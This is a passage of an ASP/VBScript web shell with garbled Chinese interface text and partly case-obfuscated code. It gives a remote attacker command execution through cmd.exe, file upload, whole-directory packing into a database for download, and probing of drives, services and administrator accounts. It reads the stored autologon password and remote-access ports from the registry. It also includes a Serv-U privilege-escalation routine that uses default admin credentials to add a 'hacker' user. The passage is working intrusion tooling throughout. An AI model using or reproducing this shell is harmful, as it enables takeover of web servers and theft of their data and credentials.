CONn.EXEcutE("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
STrEAm.OPEn
streaM.TypE = 1
rS.OPEN "FileData", cOnn, 3, 3
If ReQuEsT("theMethod") = "fso" theN
FsOTrEEforMDB thepaTH, Rs, sTrEAm
 eLSE
SATrEeforMDB thEpATH, Rs, STrEAm
enD IF
rs.ClosE
coNN.CLoSE
stREaM.CLosE
Set rs = NOThInG
set Conn = nothINg
sET stReam = NOThinG
SEt AdOcAtaloG = nOTHIng
End Sub
sUb CreateFoldER(ThePath)
DIM i
I = instR(Thepath, "\")
Do whILe I > 0
iF fSOX.FoLDERExIsts(LEft(THEPaTH, i)) = faLse TheN
fSox.CreatEFOLDEr(lEft(THePatH, I - 1))
end If
IF INSTR(mid(THePAth, i + 1), "\") tHEN
i = i + INsTr(mid(ThePaTh, i + 1), "\")
 ELSe
i = 0
eND If
LOOP
eND sUB
sUB SAtreEforMdB(thePaTh, rs, STREam)
diM iTeM, tHEFOlDER, SySFilELIsT
SYSfileliSt = "$HYTop.mdb$HYTop.ldb$"
SeT thEfoLdEr = sAX.NAMeSPaCe(thepath)
for eaCH iTEm in tHeFoldeR.iteMS
If ItEm.ISFoLDeR = TRUe tHen
SatrEEfoRMDB itEm.PatH, rs, Stream
 elSe
iF iNSTr(SYsFilELIsT, "$" & ItEm.naME & "$") <= 0 tHeN
rs.AddNew
rs("thePath") = MID(ITeM.PatH, 4)
sTrEAm.LoadfroMfiLe(ITEM.PATH)
RS("fileContent") = sTREAM.rEaD()
rs.uPDaTE
enD iF
enD If
NeXT
seT thefoLDeR = NoTHINg
END SUB
Sub Message(state,msg,flag):jb "<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1>":jb "  <TR>":jb "    <TD class=TBHead>ϵͳ��Ϣ</TD>":jb "  </TR>":jb "  <TR>":jb "    <TD align=middle ":jb "          <TABLE width=82% border=0 cellpadding=5 cellspacing=0>":jb "            <TR>":jb "                  <TD><FONT color=red>":jb  state:jb "</FONT></TD>":jb "                <TR>":jb "                  <TD><P>":jb  msg:jb "</P></TD>":jb "                </TR>":jb "          </TABLE>":jb "        </TD>":jb "  </TR>":jb "  <TR>":jb "    <TD class=TBEnd>":jb "        	  ":If flag=0 Then:jb "              <INPUT type=button value=�ر� onclick=""window.close();"">":jb "        ":Else:jb "              <INPUT type=button value=���� onClick=""history.go(-1);"">":jb "        ":End if:jb "        </TD>":jb "  </TR>":jb "</TABLE>":End Sub:Function Red(str):Red = "<FONT color=#>" & str & "</FONT>":End Function:Sub ScanDriveForm():Dim FSO,DriveB:Set FSO = Server.Createobject(oBt(0,0)):jb "<TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 >":jb "  <TR>":jb "    <TD colspan=5 class=TBHead>����/ϵͳ �ļ�����Ϣ</TD>":jb "  </TR>":For Each DriveB in FSO.Drives:jb "  <TR align=middle class=TBTD>":jb "    <FORM action=":jb "?Action=ScanDrive&Drive=":jb  DriveB.DriveLetter:jb " method=Post>":jb "<TD width=25"&chr(37)&"><B>�� ��</B></TD>":jb "<TD width=15"&chr(37)&">"
jb  DriveB.DriveLetter:jb ":</TD>":jb "        <TD width=20"&chr(37)&"><B>����</B></TD>":jb"<TD width=20"&chr(37)&">":Select Case DriveB.DriveType:Case 1: jb "���ƶ�":Case 2: jb "����Ӳ��":Case 3: jb "�������":Case 4: jb "CD-ROM":Case 5: jb "RAM����":Case else: jb "δ֪ ����":End Select:jb "        </TD>":jb "<TD><INPUT type=submit value=��ϸ ����></TD>":jb "</FORM>":jb "  </TR>"
Next
jb "  <TR class=TBTD>":jb "    <FORM action=":jb "?Action=ScFolder&Folder=":jb  FSO.GetSpecialFolder(0):jb " method=Post>                  ":jb "        <TD align=middle><B>Windows�ļ���</B></TD>":jb "        <TD colspan=3>":jb  FSO.GetSpecialFolder(0):jb "</TD>":jb "        <TD align=middle><INPUT type=submit value=��ϸ ����></TD>":jb "        </FORM>":jb "  </TR>":jb "  <TR class=TBTD>":jb "    <FORM action=":jb "?Action=ScFolder&Folder=":jb  FSO.GetSpecialFolder(1)
jb " method=Post>                  ":jb "        <TD align=middle><B>System32�ļ���</B></TD>":jb "        <TD colspan=3>":jb  FSO.GetSpecialFolder(1):jb "</TD>":jb "        <TD align=middle><INPUT type=submit value=��ϸ����></TD>":jb "        </FORM>":jb "  </TR>":jb "  <TR class=TBTD>":jb "    <FORM action=":jb "?Action=ScFolder&Folder=":jb  FSO.GetSpecialFolder(2):jb " method=Post>                  ":jb "        <TD align=middle><B>ϵͳ��ʱ�ļ���</B></TD>":jb "        <TD colspan=3>":jb  FSO.GetSpecialFolder(2):jb "</TD>":jb "        <TD align=middle><INPUT type=submit value=��ϸ ����></TD>":jb "<TR class=TBTD> <FORM action= method=Post>":jb "<TD align=middle><B>վ���Ŀ¼</B></TD>":jb "<TD colspan=3>":jb "վ���Ŀ¼":jb "<TD align=middle><a href="&URL&"?Action=ScFolder&Folder="&WWWROOt&">��� ��ѯ</a></TD>":jb "<TR class=TBTD> <FORM action= method=Post>":jb "<TR class=TBTD> <FORM action= method=Post>":jb "<TD align=middle><B>����վĿ¼</B></TD>":jb "<TD colspan=3>":jb "����վĿ¼ ":jb "<TD align=middle><a href="&URL&"?Action=ScFolder&Folder=c:\recycler\>��� ��ѯ</a></TD>":jb "<TR class=TBTD> <FORM action= method=Post>":jb "<TR class=TBTD> <FORM action= method=Post>":jb "<TD align=middle><B>wmpubĿ¼ </B></TD>":jb "<TD colspan=3>":jb "wmpub":jb "<TD align=middle><a href="&URL&"?Action=ScFolder&Folder=c:\wmpub\&D:\wmpub\>�����ѯ</a></TD>":jb "<TR class=TBTD> <FORM action= method=Post>":jb "        </FORM>":jb "  </TR>":jb "</TABLE><BR>":jb "<DIV align=center>":jb "  <FORM Action=":jb "?Action=ScFolder method=Post>ָ���ļ��� ��ѯ��":jb "    <INPUT type=text name=Folder>"
jb "        <INPUT type=submit value=���ɱ���>��ָ���ļ���·�����磺C:\ASP\":jb "  </FORM>":jb "<DIV>":Set FSO=Nothing:End Sub:Sub ScanDrive(Drive):Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D:If Drive <> "" Then
Set FSO = Server.Createobject(oBt(0,0))
Set TestDrive = FSO.GetDrive(Drive)
If TestDrive.IsReady Then
Temp_Str = "<LI>���̷������ͣ�" & Red(TestDrive.FileSystem) & "<LI>�������кţ�" & Red(TestDrive.SerialNumber) & "<LI>���̹�������" & Red(TestDrive.ShareName) & "<LI>������������" & Red(CInt(TestDrive.TotalSize/1048576)) & "<LI>���̾�����" & (TestDrive.VolumeName) & "<LI>���̸�Ŀ¼:" & ScReWr((Drive & ":\"))
Set BaseFolder = TestDrive.RootFolder
Set TempFolders = BaseFolder.SubFolders
For Each D in TempFolders
Temp_Str = Temp_Str & "<LI>�ļ��У�" & ScReWr(D)
Next
Set TempFolder = Nothing
Set BaseFolder = Nothing
Else
Temp_Str = Temp_Str & "<LI>���̸�Ŀ¼:" & Red("���ɶ�:(")
Dim TempFolderList,t:t=0
Temp_Str = Temp_Str & "<LI>" & Red("���Ŀ¼���ԣ�")
TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp")
For i = 0 to Ubound(TempFolderList)
If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
t = t+1
Temp_Str = Temp_Str & "<LI>�����ļ��У�" & ScReWr(Drive & ":\" & TempFolderList(i))
End if
Next
If t=0 then Temp_Str = Temp_Str & "<LI>�����" & Drive & "�̸�Ŀ¼����δ�з���:("
End if
Set TestDrive = Nothing
Set FSO = Nothing
Temp_Str = Temp_Str & "" & ("")
Message Drive & ":������Ϣ",Temp_Str,1
End if
End Sub
str1=request.ServerVariables("HTTP_HOST")&request.ServerVariables("URL")
Sub ScFolder(folder) 
On Error Resume Next
Dim FSO,OFolder,TempFolder,Scmsg,S
Set FSO = Server.Createobject(oBt(0,0))
If FSO.FolderExists(folder) Then
Set OFolder = FSO.GetFolder(folder)
Set TempFolders = OFolder.SubFolders
Scmsg = "<LI>ָ���ļ��и�Ŀ¼��" & ScReWr(folder)
For Each S in TempFolders
Scmsg = Scmsg&"<LI>�ļ��У�" & ScReWr(S)  
Next
Set TempFolders = Nothing
Set OFolder = Nothing
Else
Scmsg = Scmsg & "<LI>�ļ��У�" & (folder & "�����ڻ��޶�Ȩ��!")
End if
Scmsg = Scmsg & "" & ("")
Set FSO = Nothing
Message "�ļ�����Ϣ",Scmsg,1
End Sub


Function ScReWr(folder) 
On Error Resume Next
Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
Set FSO = Server.Createobject(oBt(0,0))
Set TestFolder = FSO.GetFolder(folder)
Set TestFileList = TestFolder.SubFolders
RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
For Each A in TestFileList
Next
If err Then
err.Clear
ReWrStr = folder & " <FONT color=PINK>���ɶ�,"
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "<FONT color=PINK>����д��</FONT>"
Else
ReWrStr = ReWrStr & "<FONT color=RED>��д��</FONT>"
FSO.DeleteFile folder & RndFilename,True
End If
Else
ReWrStr = folder & "<FONT color=RED> �ɶ�,"
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "<FONT color=PINK>����д��</FONT>"
Else
ReWrStr = ReWrStr & "<FONT color=RED>��д��</FONT>"
FSO.DeleteFile folder & RndFilename,True
End if
End if
Set TestFileList = Nothing
Set TestFolder = Nothing
Set FSO = Nothing
ScReWr = ReWrStr
End Function
Function Course()
si="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
SI=Si&"<tr><td height='20' colspan='3' align='center' bgcolor='#'>ϵͳ�û������</td></tr>"
on erRoR reSUme NEXT
For eACh obJ in geToBJeCt("WinNT://.")
Err.clEAR
If ObJ.STArtTYpe="" THeN
sI=SI&"<tr>"
Si=SI&"<td height=""20"" bgcolor=""#"">&nbsp;"
si=si&Obj.naME
sI=sI&"</td><td bgcolor=""#"">&nbsp;" 
si=SI&"ϵͳ��_��(��)"
si=Si&"</td></tr>"
Si0="<tr><td height=""20"" bgcolor=""#"" colspan=""2"">&nbsp;</td></tr>" 
EnD if
iF oBj.StArTtype=2 thEN lx="�Զ�"
IF oBj.StARTTyPe=3 tHEN LX="�ֶ�"
IF obj.StarTtYpE=4 thEN LX="����"
iF LCaSe(mid(obj.pAth,4,3))<>"win" AnD obJ.STarttYpe=2 tHeN
Si1=si1&"<tr><td height=""20"" bgcolor=""#"">&nbsp;"&obj.NAME&"</td><td height=""20"" bgcolor=""#"">&nbsp;"&OBj.DISPlaYName&"<tr><td height=""20"" bgcolor=""#"" colspan=""2"">[��������:"&Lx&"]<font color=#FF0000>&nbsp;"&ObJ.PATh&"</font></td></tr>"
ELSE
si2=sI2&"<tr><td height=""20"" bgcolor=""#"">&nbsp;"&obj.NAme&"</td><td height=""20"" bgcolor=""#"">&nbsp;"&oBj.DisplAYNaMe&"<tr><td height=""20"" bgcolor=""#"" colspan=""2"">[��������:"&Lx&"]<font color=#3399FF>&nbsp;"&OBj.PAtH&"</font></td></tr>"
end if
nExt
jb si&Si0&sI1&si2&"</table>"
ENd Function


fuNcTion DownFILE(PAth)
RespoNse.cleAr
sEt Osm = creATEOBJeCT(OBT(6,0))
oSM.oPEN
oSM.tYPe = 1
osm.lOAdfromFILe PatH
Sz=inSTRrEv(PAth,"\")+1
ReSPoNse.AddHEaDer "Content-Disposition", "attachment; filename=" & mid(pAth,SZ)
RESPOnSe.AdDHeAder "Content-Length", Osm.SIzE
ResPOnsE.ChARSET = "UTF-8"
ReSPOnSe.CONTENTTYpE = "application/octet-stream"
RESPONSE.binArywRiTE oSm.Read
rEsponSE.flUSh
osM.cLoSe
SeT OsM = nOThINg
eNd FUnction
fUnCtIOn htMLeNcODe(s)
if NoT iSnull(s) THen
S = ReplACE(S, ">", "&gt;")
S = rePlaCE(s, "<", "&lt;")
S = rEplAce(S, CHR(39), "&#39;")
S = RepLAcE(S, chR(34), "&quot;")
S = REPLACE(s, chr(20), "&nbsp;")
hTmLencoDE = S
End iF
End Function:Sub GetTerminalInfo()
on error resume next
dim wsh
set wsh=createobject("Wscript.Shell")
jb "[���� ̽��]<br><hr size=1>"
EnableTCPIPKey="HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters"
isEnable=Wsh.Regread(EnableTcpipKey)
If isEnable=0 or isEnable="" Then
Notcpipfilter=1
End If
ApdKey="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind"
Apds=Wsh.RegRead(ApdKey)
If IsArray(Apds) Then 
For i=LBound(Apds) To UBound(Apds)-1
jb "����"&i&"������Ϊ: "&ApdB&"<br>"
Path="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\"
IPKey=Path&ApdB&"\IPAddress"
IPaddr=Wsh.Regread(IPKey)
If IPaddr(0)<>"" Then
For j=Lbound(IPAddr) to Ubound(IPAddr)
jb "<li>IP��ַ"&j&"Ϊ:"&IPAddr(j)&"<br>"
Next
Else
jb "<li>IP��ַ �޷���ȡ ��û������<br>"
End if
GateWayKey=Path&ApdB&"\DefaultGateway"
GateWay=Wsh.Regread(GateWayKey)
If isarray(GateWay) Then
For j=Lbound(Gateway) to Ubound(Gateway)
jb "<li>����"&j&"Ϊ:"&Gateway(j)&"<br>"
Next
Else
jb "<li>Ĭ�������޷� ��ȡ�� û������ <br>"
End if
DNSKey=Path&ApdB&"\NameServer"
DNSstr=Wsh.RegRead(DNSKey)
If DNSstr<>"" Then
jb "<li>����DNSΪ:"&DNSstr&"<br>"
Else
jb "<li>Ĭ��DNS �޷���ȡ ��û������<br>"
End If
if Notcpipfilter=1 Then 
jb "<li>û�� Tcp/IPɸѡ <br>"
else
ETK="\TCPAllowedPorts"
EUK="\UDPAllowedPorts"
FullTCP=Path&ApdB&ETK
FullUDP=path&ApdB&EUK
tcpallow=Wsh.RegRead(FullTCP)
If tcpallow(0)="" or tcpallow(0)=0 Then
jb "<li>�����TCP�˿�Ϊ :ȫ��<br>"
Else
jb "<li>�����TCP �˿�Ϊ:"
For j = LBound(tcpallow) To UBound(tcpallow)
jb tcpallow(j)&","
Next
jb "<Br>"
End if
udpallow=Wsh.RegRead(FullUDP)
If udpallow(0)="" or udpallow(0)=0 Then
jb "<li>�����UDP�˿�Ϊ:ȫ��<br>"
Else
jb "<li>�����UDP �˿�Ϊ:"
for j = LBound(udpallow) To UBound(udpallow)
jb UDPallow(j)&","
next
jb "<br>"
End if
End if
jb "------------------------------------------------<br>"
Next
end if
jb "<br><br>[����˿� ̽��]<br><hr size=1>"
Telnetkey="HKEY_LOCAL_MACHINE\SOFTWARE\ Microsoft\TelnetServer\1.0\TelnetPort"
TlntPort=Wsh.RegRead(TelnetKey)
if TlntPort="" Then Tlnt="23(Ĭ�� ����)"
jb "<li>Telnet�� ��:"&Tlntport&"<br>"
TermKey="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber"
TermPort=Wsh.RegRead(TermKey)
If TermPort="" Then TermPort="�޷���ȡ.�� ȷ���Ƿ�ΪWindows Server�汾 ����"
jb "<li>Terminal Service�˿�Ϊ:"&TermPort&"<br>"
pcAnywhereKey="HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"
PAWPort=Wsh.RegRead(pcAnywhereKey)
If PAWPort="" then PAWPort="�޷���ȡ. �� ȷ���� ���� ��װpcAnywhere"
jb "<li>PcAnywhere�˿�Ϊ:"&PAWPort&"<br>"
jb "------------------------------------------------------"
Set wsX = Server.CreateObject("WScript.Shell")
Dim terminalPortPath, terminalPortKey, termPort
Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
terminalPortKey = "PortNumber"
termPort = wsX.RegRead(terminalPortPath & terminalPortKey)
jb"�ն˷���˿ڼ��Զ���¼<ol>"
If termPort = "" Or Err.Number <> 0 Then 
jb"�� ���õ��ն˷���˿� , ����Ȩ���Ƿ��Ѿ��� ������ .<br/>"
Else
jb"�� ǰ �� �� �� �� �� �� : " & termPort & "<br/>"
End If
autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
autoLoginEnableKey = "AutoAdminLogon"
autoLoginUserKey = "DefaultUserName"
autoLoginPassKey = "DefaultPassword"
isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
If isAutoLoginEnable = 0 Then
jb"ϵͳ�Զ���¼ ����δ����<br/>"
Else
autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
jb"�Զ���¼ ��ϵͳ �ʻ� : " & autoLoginUsername & "<br>"
autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
If Err Then
Err.Clear
jb"False"
End If
jb"�Զ� ��¼�� �ʻ� ����  : " & autoLoginPassword & "<br>"
End If
jb"</ol>"
jb "<br><br><br>[ϵͳ ���̽��]<br><hr size=1>"
SoftPath=Wsh.Environment.item("Path")
Pathinfo=lcase(SoftPath)
jb "ϵͳ���֧��:"
if Instr(Pathinfo,"perl") Then jb "<li>Perl�� ��:֧��<br>"
if instr(Pathinfo,"java") Then jb "<li>Java�ű�: ֧��<br>"
if instr(Pathinfo,"microsoft sql server") Then jb "<li>MSSQL���ݿ����:֧��<br>"
if instr(Pathinfo,"mysql") Then jb "<li>MySQL�� �ݿ� ����: ֧��<br>"
if instr(Pathinfo,"oracle") Then jb "<li>Oracle���� �����: ֧��<br>"
if instr(Pathinfo,"cfusionmx7") Then jb "<li>CFM������ :֧��<br>"
if instr(Pathinfo,"pcanywhere") Then jb "<li>������ ��PcAnywhere�� ��:֧��<br>"
if instr(Pathinfo,"Kill") Then jb "<li>Killɱ���� ��:֧��<br>"
if instr(Pathinfo,"kav") Then jb "<li> ��ɽϵ�� ɱ����� :֧��<br>"
if instr(Pathinfo,"antivirus") Then jb "<li>��������ɱ�����:֧��<br>"
if instr(Pathinfo,"rising") Then jb "<li>����ϵ��ɱ�����:֧��<br>"
paths=split(SoftPath,";")
jb "------------------------------------<br>"
jb "ϵͳ��ǰ ·������:<br>"
For i=Lbound(paths) to Ubound(paths)
jb "<li>"&paths(i)&"<br>"
next
jb "<br><br>[ϵ ͳ���� ̽��]<br><hr size=1>"
pcnamekey="HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName"
pcname=wsh.RegRead(pcnamekey)
if pcname="" Then pcname="�޷���ȡ������.<br>"
jb "<li>��ǰ�� ���� Ϊ:"&pcname&"<br>"
AdminNameKey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AltDefaultUserName"
AdminName=wsh.RegRead(AdminNameKey)
if adminname="" Then AdminName="Administrator"
jb "<li>Ĭ�Ϲ� ��Ա�û���Ϊ:"&AdminName&"<br>"
isAutologin="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoAdminLogon"
Autologin=Wsh.RegRead(isAutologin)
if Autologin=0 or Autologin="" Then
jb "<li>�û��Զ��� ��:δ����<br>"
Else
jb "<li>�û� �Զ�����:����<br>"
Admin=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName")
Passwd=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword")
jb "<li type=square>�û���:"&Admin&"<br>"
jb "<li type=square>����:"&Passwd&"<br>"
End if
displogin=wsh.regRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DontDisplayLastUserName")
If displogin="" or displogin=0 Then disply="��" else disply="��"
jb "<li>�Ƿ���ʾ�� �ε����û�:"&disply&"<br>"
NTMLkey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\NTML"
ntml=Wsh.RegRead(NTMLkey)
if ntml="" Then Ntml=1
jb "<li>Telnet Ntml����Ϊ:"&ntml&"<br>"
hk="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count"
kk=wsh.RegRead(hk)
jb"<li>��ǰ��� ��Ϊ:"&kk&"<br>"
jb "------------------------------------<br><br><br>"
jb "[���� ���� ��̽��]<br><hr>"
Set objComputer = GetObject("WinNT://.")
Set sa = Server.CreateObject("Shell.Application")
objComputer.Filter = Array("Service")
On Error Resume Next
For Each objService In objComputer
if objService.Name="Serv-U" Then
if objService.ServiceAccountName="LocalSystem" Then
jb "<li>������ ���� Se rv-U �� װ,����LocalSystemȨ������,���� ������Ȩ<br>"
End if
End if
if lcase(objService.Name)="apache" Then
if objService.ServiceAccountName="LocalSystem" Then
If instr("&woriniba&","Apache") Then
jb "<li>��ǰWEB�� ����Ϊ Apache.����ֱ����Ȩ<br>"
Else
jb " <li>����������Apache�� �����,����Ȩ��ΪLocalSystem,���Կ� ��PHPľ��<br>"
End if
end if
End if
if instr(lcase(objService.Name),"tomcat") Then
if objService.ServiceAccountName="LocalSystem" Then
jb "<li>������ ����Tomcat,����LocalSystemȨ������,���� ����ʹ��Jspľ ����Ȩ<br>"
End if
End if
if instr(lcase(objService.Name),"winmail") Then
if objService.ServiceAccountName="LocalSystem" Then
jb "<li>���� ������Magic Winmail,����LocalSystemȨ������,���Բ���WebMai lĿ¼,����д��PHPľ��<br>"
End if
End if
Next
Set fso=Server.Createobject("Scripting.FileSystemObject")
Sysdrive=left(Fso.GetspecialFolder(2),2)
servername=wsh.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName")
If fso.FileExists(sysdriver&"\Documents And Settings\All Users\Application Data\Symantec\"&servername&".cif") Then
jb "<li>����pcAnywher e�����ļ�,���Դ�Ĭ��Ŀ¼���ز� �ƽ� �õ�pcAnyw here�� ��"
End if
end sub:Function UpFile()
 If Request("Action2")="Post" Then
Set U=new UPC : Set F=U.UA("LocalFile")
UName=U.form("ToPath")
 If UName="" Or F.FileSize=0 then
  SI="<br>����_���ϴ�_����ȫ_·����ѡ��_һ���ļ�_�ϴ�!"
  Else
 F.SaveAs UName
 If Err.number=0 Then
 SI="<center><br><br><br>�ļ�"&UName&"�� �� �ɹ���</center>"
  End if
 End If
Set F=nothing:Set U=nothing
 SI=SI&BackUrl
 jb SI
 ShowErr()
 Response.End
  End If
    SI="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
    SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
    SI=SI&"<tr><td>"
    SI=SI&"�ϴ�·����<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\Cmd.exe")&"' size='40'>"
    SI=SI&" <input name='LocalFile' type='file'  size='25'>"
    SI=SI&" <input type='submit' name='Submit' value='�ϴ�'>"
    SI=SI&"</td></tr></form></table>"
  echo SI
End Function
function cmd1shell()
on error resume next
if request("sp")<>"" then session("shellpath") = request("sp")
shellpath=session("shellpath")
if shellpath="" then shellpath = "cmd.exe"
if request("cmd")<>"" then session("defcmd") = request("cmd")
defcmd=session("defcmd")
if defcmd="" then defcmd="set"
if request("rwpath")<>"" then session("rwpath") = request("rwpath")
rwpath=session("rwpath")
if rwpath="" then rwpath=server.mappath(".")
si="<form method='post'>"
rp1="<input type=""radio"" name=""cmdtype"" value="""
si=si&"cmd·����<input name='sp' value='"&shellpath&"' style='width:35%'>  �ɶ�дĿ¼(���ڻ���)<input name='rwpath' value='"&rwpath&"' style='width:35%'><br>"
si=si&"<input type='hidden' name='action' value='Cmd1Shell'>"
si=si&rp1&"wscript"" checked>wscript"
si=si&rp1&"wscript.shell"">wscript.shell"
si=si&rp1&"wscript.shell.1"">wscript.shell.1"
si=si&rp1&"shell.application"">shell.application"
si=si&rp1&"shell.application.1"">shell.application.1"
si=si&"<input name='cmd' style='width:92%' value='"&defcmd&"'> <input type='submit' value='ִ��'>"

set fso=server.createobject("scripting.filesystemobject")
sztempfile = rwpath&"\cmd.txt"
select case request("cmdtype")
case "wscript"
set cm=server.createobject("wscript.shell")
set dd=cm.exec(shellpath&" /c "&defcmd)
aaa=dd.stdout.readall
si=si&"<text"&"area style='width:100%;height:440;' class='cmd'>"
si=si&aaa
si=si&chr(13)&"</text"&"area></form>"
case "wscript.shell","wscript.shell.1"
on error resume next
set ws=server.createobject(request("cmdtype"))
call ws.run (shellpath&" /c " & defcmd & " > " & sztempfile, 0, true)
set ofilelcx = fso.opentextfile (sztempfile, 1, false, 0)
aaa=server.htmlencode(ofilelcx.readall)
ofilelcx.close
call fso.deletefile(sztempfile, true)
si=si&"<text"&"area style='width:100%;height:440;' class='cmd'>"
si=si&aaa
si=si&chr(13)&"</text"&"area></form>"
case "shell.application","shell.application.1"
set seshell=server.createobject(request("cmdtype"))

seshell.ShellExecute shellpath," /c " & defcmd & " > " & sztempfile,"","open",0
si=si&"<iframe id=cmdResult src='?cmdtype=shellresult&Action=Cmd1Shell' style='width:100%;height:440;'>"
case "shellresult"
response.Clear()
on error resume next
jb "<body style=""background:#000000""><span style=""color:#FFFFFF"">"
if fso.fileexists(sztempfile)=true then
set ofilelcx = fso.opentextfile (sztempfile, 1, false, 0)
ss=server.htmlencode(ofilelcx.readall)
ss=replace(ss,vbnewline,"<br>")
jb ss
ofilelcx.close
call fso.deletefile(sztempfile, true)
else
jb "<meta http-equiv=""refresh"" content=""1"" />����δ����������û��ִ�гɹ����ȴ�ˢ������"
end if
if err then jb "<meta http-equiv=""refresh"" content=""1"" />����δ����������û��ִ�гɹ����ȴ�ˢ������"
jb"</span></body>"
response.end
end select
jb si
end function
function createmdb(path)
si="<br><br>"
set c = createobject(obt(2,0))
c.create("provider=microsoft.jet.oledb.4.0;data source=" & path)
set c = nothing
if err.number=0 then
si = si & path & "�����ɹ�!"
end if
si=si&backurl
echo si
end function
:Function CompactMdb(Path)
If Not ObT(0,1) Then
Set C=CreateObject(ObT(3,0)) 
C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path
Set C=Nothing
Else
  Set FSO=CreateObject(ObT(0,1))
If FSO.FileExists(Path) Then
    Set C=CreateObject(ObT(3,0)) 
C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path&"_bak"
 Set C=Nothing
FSO.DeleteFile Path
        FSO.MoveFile Path&"_bak",Path
 Else
    SI="<center><br><br><br>���ݿ�"&Path&"û�� ���֣�</center>" 
  Err.number=1
  End If
  Set FSO=Nothing
End If
  If Err.number=0 Then
    SI="<center><br><br><br>���ݿ�"&Path&"ѹ�� �ɹ���</center>"
  End If
  SI=SI&BackUrl
  echo SI
End Function:







Function AdminUser()
Response.Expires=0
on error resume next
Set tN=server.createObject("Wscript.Network")
Set objGroup=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
For Each admin in objGroup.Members
jb admin.Name&"<br>"
Next
if err then
jb "not:Wscript.Network"
end if
End Function




:
Function suftp():jb"<p><center>Serv-U FTP��Ȩ ����--ͨɱ��<br><br>IP����˵��:<br>������IP:0.0.0.0�����κ�IP����������<br>���0.0.0.0���ɹ����޸ĳɴ�IP :"&worininai&"<br>����ٲ��ɹ��ʹ���Serv_u���뱻�� </p>"
jb"<form name='form1' method='post' action=''>":jb"<center>������IP :<input name='serip' type='text' class='TextBox' id='duser' value='0.0.0.0'><br>":jb"<center>����Ա  :<input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'><br>":jb"<center>����Ա ���� :<input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'><br>":jb"<center>SERV-U�˿� :<input name='dport' type='text' class='TextBox' id='dport' value='43958'><br>":jb"<center>��ӵ��û��� :<input name='tuser' type='text' class='TextBox' id='tuser' value='hacker'><br>":jb"<center>��ӵ��û����� :<input name='tpass' type='text' class='TextBox' id='pass' value='hacker'><br>":jb"<center>�ʺŵ����Ե�·�� :<input name='tpath' type='text' class='TextBox' id='tpath' value='C:\'><br>":jb"<center>����˿� :<input name='tport' type='text' class='TextBox' id='tport' value='21'><br>":jb"<center><input name='radiobutton' type='radio' value='add' checked class='TextBox'>ȷ����� ":jb"<center><input type='radio' name='radiobutton' value='del' class='TextBox'>ȷ��ɾ�� ":jb"<p><input name='Submit' type='submit' class='buttom' value='�ύ'></p></form>"
nimajbm = request.form("serip")
usr = request.form("duser")
pwd = request.form("dpwd")
port = request.form("dport")
tuser = request.form("tuser")
tpass = request.form("tpass")
tpath = request.form("tpath")
tport = request.form("tport")
hostip = request.form("hostp")
timeout=600
if request.form("radiobutton") = "add" then
leaves = "User " & usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DeleteDOMAIN" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & " PortNo=" & tport & vbcrlf
mt = "SITE MAINTENANCE" & vbcrlf
